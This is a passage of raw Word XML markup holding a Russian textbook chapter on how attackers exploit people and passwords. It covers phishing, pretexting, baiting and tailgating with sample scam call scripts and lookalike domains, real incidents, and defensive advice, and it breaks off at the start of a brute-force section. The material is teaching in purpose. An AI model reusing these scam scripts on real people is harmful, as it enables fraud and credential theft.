      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>злоумышленники ищут самое слабое звено</w:t>
      </w:r>
      <w:r>
        <w:t>. Даже если у тебя идеальное шифрование и файрволл, хакер найдёт:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сотрудника, который кликнет на фишинг</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Админа с дефолтным паролем</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Уязвимость в WordPress-плагине</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Открытый порт, о котором забыли</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Закон безопасности</w:t>
      </w:r>
      <w:r>
        <w:t>: *Система безопасна настолько, насколько безопасно её самое слабое звено.*</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>В этой главе мы разберём:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Социальная инженерия** (фишинг, претекстинг, бейтинг, quid pro quo)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Атаки на пароли** (brute force, словарь, rainbow tables, credential stuffing)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Сетевые атаки** (MITM, сниффинг, spoofing, DDoS)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Атаки на веб-приложения** (SQL-инъекция, XSS, CSRF, RCE)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Вредоносное ПО** (вирусы, черви, трояны, ransomware, spyware, rootkit)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Атаки на Wi-Fi** (взлом WEP/WPA2, Evil Twin, деаутентификация)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Физический доступ** (кража устройств, shoulder surfing, USB drop)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Реальные примеры** (Target 2013, Sony 2014, NotPetya 2017, SolarWinds 2020, Twitter hack 2020)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Эта глава связана с:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Главой 9.03 (Угрозы ИБ)** — там мы говорили об угрозах, тут — о способах их реализации</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Главой 9.04 (Противодействие)** — там защита, тут — атаки</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Главой 9.06 (Методы реализации угроз)** — там технические детали, тут — обзор</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Главой 9.02 (Криптография)** — атаки на слабое шифрование</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Главой 8.04 (Протоколы Internet)** — сетевые атаки (MITM, DDoS)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.5.1. Социальная инженерия: Как обмануть мозг вместо компьютера</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Социальная инженерия</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — манипуляция людьми с целью выманить конфиденциальную информацию или заставить выполнить нужные действия.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Почему это работает?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Потому что </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>люди — самое слабое звено</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> в безопасности. Легче обмануть человека, чем взломать AES-256.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Психологические триггеры</w:t>
      </w:r>
      <w:r>
        <w:t>, которые используют злоумышленники:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Доверие к авторитету** — «Я из IT-отдела, срочно нужен ваш пароль»</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Срочность** — «Ваш аккаунт заблокируют через 1 час, кликните сюда»</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Страх** — «Обнаружена подозрительная активность, подтвердите личность»</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Жадность** — «Вы выиграли iPhone, введите номер карты для доставки»</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Любопытство** — «Посмотрите, кто разместил ваше фото без одежды» (ссылка на вирус)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Фишинг (Phishing)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t>: Отправка поддельных email/SMS/сообщений, которые маскируются под легитимные (банк, соцсеть, начальник), чтобы украсть учётные данные или установить вирус.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Типы фишинга</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Email-фишинг** (массовая рассылка):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Цель: поймать хотя бы 0.1% получателей</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пример: «Ваш аккаунт Netflix заблокирован, обновите платёжные данные»</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Ссылка ведёт на поддельный сайт `netfllx.com` (заметил двойную L?)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Spear Phishing** (целевой фишинг):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Атака на конкретного человека (CEO, бухгалтера, админа)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Злоумышленник изучает жертву (LinkedIn, соцсети) и подстраивает письмо</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пример: «Привет, Иван! Помнишь, мы встречались на конференции DevOps в Москве? Вот презентация...» (ссылка на вирус)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Whaling** (охота на китов):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Фишинг на топ-менеджеров (CEO, CFO)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Цель: получить доступ к критичным системам или финансам</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пример: Злоумышленник притворяется юристом: «Срочно подпишите контракт» (PDF со встроенным эксплойтом)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Smishing** (SMS-фишинг):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Фишинг через SMS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пример: «Ваша посылка ожидает в пункте выдачи, трек-код: [ссылка]» (ссылка на установку Android-трояна)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Vishing** (Voice Phishing):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Фишинг по телефону</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Злоумышленник звонит: «Здравствуйте, служба безопасности банка. На вашей карте подозрительная операция, назовите CVV для блокировки»</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Жертва называет CVV → хакер списывает деньги</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Признаки фишинга</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Подозрительный домен: `paypa1.com` (единица вместо L), `amazon-security.tk`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Грамматические ошибки: «Ваш аккаунт был взлмоан»</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Паника и срочность: «Подтвердите в течение 1 часа, иначе...»</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Просьба ввести пароль/CVV/номер карты</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Вложение с подозрительным расширением: `invoice.pdf.exe`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Реальный пример — Twitter hack 2020</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">В июле 2020 хакеры взломали аккаунты </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Barack Obama, Elon Musk, Bill Gates, Apple, Uber</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> и разместили фишинговое сообщение: «Doubling all payments sent to this Bitcoin address» (отправь биткоины, получишь вдвое больше — классический скам).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как это произошло?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Хакеры позвонили сотрудникам Twitter, представившись из IT-отдела (vishing)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Выманили учётные данные для внутренней панели управления</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Получили доступ к инструменту сброса паролей</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Украли **$120,000** в биткоинах за несколько часов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод</w:t>
      </w:r>
      <w:r>
        <w:t>: Даже топовые компании уязвимы, если сотрудники не обучены распознавать фишинг.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Претекстинг (Pretexting)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t>: Создание ложного сценария (предлога) для выманивания информации.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Отличие от фишинга</w:t>
      </w:r>
      <w:r>
        <w:t>: Фишинг — массовая атака, претекстинг — целевая, с подробной легендой.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 1 — Звонок «из IT-отдела»</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">Злоумышленник (по телефону): «Здравствуйте, я Сергей из технической поддержки. </w:t>
        <w:br/>
        <w:t xml:space="preserve">                              У нас сбой на сервере, нужно проверить ваш аккаунт. </w:t>
        <w:br/>
        <w:t xml:space="preserve">                              Назовите, пожалуйста, ваш пароль для диагностики.»</w:t>
        <w:br/>
        <w:t>Жертва: «Мой пароль — IvanPetrov2023»</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 2 — Звонок «из банка»</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">Злоумышленник: «Добрый день, служба безопасности Сбербанка. </w:t>
        <w:br/>
        <w:t xml:space="preserve">                По вашей карте прошла подозрительная операция на 50,000₽. </w:t>
        <w:br/>
        <w:t xml:space="preserve">                Это были вы?»</w:t>
        <w:br/>
        <w:t>Жертва: «Нет!»</w:t>
        <w:br/>
        <w:t>Злоумышленник: «Тогда срочно назовите CVC-код на обороте карты, чтобы заблокировать операцию.»</w:t>
        <w:br/>
        <w:t>Жертва (в панике): «123» (называет код)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Защита</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Никогда не называй пароли/CVV** по телефону — легитимные компании НИКОГДА не просят этого</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Перезвони в банк/компанию по официальному номеру с сайта</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Спроси у «сотрудника» внутренний номер и перезвони через секретаря</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Бейтинг (Baiting)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Атака, основанная на </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>любопытстве или жадности</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> жертвы. Злоумышленник «подбрасывает приманку» (физическую или виртуальную).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 1 — USB Drop Attack</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Хакер оставляет USB-флешки с надписью «Зарплаты 2025» или «Конфиденциально» на парковке офиса</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Любопытный сотрудник подбирает флешку и вставляет в рабочий компьютер</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Флешка автозапускает вирус → хакер получает доступ к корпоративной сети</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Реальный пример — Stuxnet (2010)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Вирус **Stuxnet** (кибероружие США/Израиля против иранской ядерной программы) распространялся через USB-флешки</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Хакеры подбросили заражённые флешки рядом с иранским ядерным объектом</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сотрудники принесли флешки внутрь (объект изолирован от интернета — air gap)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Stuxnet вывел из строя центрифуги по обогащению урана</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 2 — Поддельный Wi-Fi</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>В кафе создаётся точка доступа `Starbucks_Free_WiFi` (рядом с настоящим `Starbucks_WiFi`)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Жертвы подключаются → хакер перехватывает трафик (MITM)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Защита</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Не подключай неизвестные USB** (даже если написано «Секретное видео»)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Отключи автозапуск USB в настройках ОС</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Используй VPN в публичных Wi-Fi</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Quid Pro Quo (Услуга за услугу)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t>: Обещание выгоды в обмен на информацию.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Злоумышленник звонит в компанию:</w:t>
        <w:br/>
        <w:t xml:space="preserve">«Здравствуйте, мы проводим бесплатное обновление антивируса для всех сотрудников. </w:t>
        <w:br/>
        <w:t xml:space="preserve"> Чтобы установить, мне нужен удалённый доступ к вашему компьютеру на 5 минут.»</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Жертва даёт доступ → хакер устанавливает бэкдор</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Защита</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Никогда не давай удалённый доступ** незнакомцам</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Проверяй запросы у своего IT-отдела</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Tailgating / Piggybacking (Проникновение вслед)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t>: Физическое проникновение в защищённую зону, следуя за легитимным пользователем.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Хакер стоит у входа в офис с коробкой кофе или ноутбуком в руках</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сотрудник прикладывает бейдж и открывает дверь</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Хакер: «Спасибо!» (проходит следом)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сотрудник не задаёт вопросов (вежливость / предполагает, что хакер — коллега)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Реальный пример</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>В 2018 тестировщики безопасности (ethical hackers) проникли в **19 из 21 банка** США, просто идя следом за сотрудниками</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Защита</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Не пропускай незнакомых** (даже если неудобно отказать)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Установи турникеты с контролем одного прохода</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Обязательные бейджи для всех</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.5.2. Атаки на пароли: Когда `123456` — худший выбор в жизни</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Пароли — первая линия обороны. Но </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>61%</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> пользователей используют один и тот же пароль на всех сайтах (Google, 2019). </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Это пиздец, товарищи.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Brute Force (Перебор)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t>: Систематический перебор всех возможных комбинаций пароля.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
